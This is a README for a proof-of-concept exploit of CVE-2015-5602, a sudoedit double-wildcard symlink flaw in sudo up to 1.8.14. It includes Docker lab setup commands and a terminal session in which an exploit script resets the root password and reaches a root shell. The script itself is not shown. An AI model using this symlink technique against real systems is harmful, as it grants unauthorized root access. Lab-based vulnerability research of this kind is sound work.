# Sudo <=1.8.14 Local Privilege Escalation

Sudo (su "do") allows a system administrator to give certain users (or groups of users) the ability to run some (or all) commands as root while logging all commands and arguments.

## Vulnerable environment

To setup a vulnerable environment for your test you will need [Docker](https://docker.com) installed, and just run the following command:

    docker build -t privesc/cve-2015-5602 .
    docker run --rm -it privesc/cve-2015-5602

And it will spawn a interactive shell with low user privileges.

## Vulnerable code

The bug was found in sudoedit, which does not check the full path if a wildcard is used twice (e.g. `/home/*/*/esc.txt`), this allows a malicious user to replace the esc.txt real file with a symbolic link to a different location (e.g. `/etc/shadow`).

Successfully exploiting this issue may allow an attacker to manipulate files and to gain root privileges on host system through symlink attacks.

## Exploit

To exploit this target just run:

    ./exploit.sh

If you are using this vulnerable image, you can just run:

    user@1cc9cd901b07:~$ sudo -l
    User user may run the following commands on 1cc9cd901b07:
        (root) NOPASSWD: sudoedit /home/*/*/esc.txt
    user@1cc9cd901b07:~$ ./exploit.sh 
    [+] CVE-2015-5602 exploit by t0kx
    [+] Creating folder...
    [+] Creating symlink
    [+] Modify EDITOR...
    [+] Change root password to: d03c09dc34c53657aff1f459a86b20ed
    [+] Done
    user@1cc9cd901b07:~$ su
    Password: 
    root@1cc9cd901b07:/home/user# id
    uid=0(root) gid=0(root) groups=0(root)
    root@1cc9cd901b07:/home/user#

## Credits

This flaw was found by Daniel Svartman.

## Disclaimer

This or previous program is for Educational purpose **ONLY**. Do not use it without permission. The usual disclaimer applies, especially the fact that me (t0kx) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears **NO** responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not t0kx's responsibility.
